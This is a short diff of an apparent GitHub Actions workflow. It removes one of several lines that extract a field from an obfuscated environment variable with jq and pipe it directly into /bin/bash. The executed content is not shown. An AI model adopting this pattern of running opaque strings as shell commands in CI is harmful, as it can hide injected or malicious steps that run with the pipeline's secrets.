@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$wciq090" | jq -r .bqncv6917 | /bin/bash
           printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
           printf '%s' "$bv5" | jq -r .iok9 | /bin/bash
-          printf '%s' "$yv241" | jq -r .mh5 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
